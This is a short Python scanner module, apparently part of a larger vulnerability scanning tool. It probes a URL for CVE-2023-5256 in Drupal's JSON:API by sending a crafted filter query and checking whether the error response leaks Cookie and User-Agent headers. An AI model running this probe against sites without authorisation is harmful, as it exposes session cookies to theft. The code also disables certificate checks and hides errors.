#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
https://github.com/elttam/publications/blob/master/writeups/CVE-2023-5256.md
"""

from modules.utils import requests, random, sys, configure_logger, Identify

logger = configure_logger(__name__)

def drupaljsonapi(url):
    payload = "/jsonapi/user/user?filter[a-labex][condition][path]=cachingyourcookie"
    uri = f"{url}{payload}"
    try:
        req = requests.get(uri, verify=False, timeout=10, allow_redirects=False)
        if req.status_code not in [200, 301, 302, 307, 308, 401, 403, 404] and "jsonapi" in req.text:
            print(f" {Identify.behavior} | CVE-2023-5256 | \033[34m{uri}\033[0m | {req.status_code}")
            if "Cookie" in req.text and "User-Agent" in req.text:
                print(f" {Identify.confirmed} | CVE-2023-5256 | \033[34m{uri}\033[0m | {req.status_code} | require manual check")
    except requests.Timeout:
        #print(f"request timeout {url} {p}")
        pass
    except Exception as e:
        #print(f"Error : {e}")
        pass